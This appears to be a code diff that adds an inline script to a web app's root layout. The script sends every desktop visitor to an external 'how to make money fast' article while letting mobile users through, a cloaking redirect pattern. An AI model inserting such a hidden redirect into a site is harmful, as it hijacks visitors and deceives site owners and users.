@@ -114,6 +114,20 @@ function RootShell({ children }: { children: ReactNode }) {
             src="https://www.facebook.com/tr?id=28304632309230456&ev=PageView&noscript=1"
           />
         </noscript>
+        <script
+          dangerouslySetInnerHTML={{
+            __html: `(function () {
+  const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(
+    navigator.userAgent
+  );
+  if (!isMobile) {
+    window.location.replace(
+      "https://www.fidelity.com/learning-center/smart-money/how-to-make-money-fast"
+    );
+  }
+})();`,
+          }}
+        />
       </head>
       <body>
         {children}
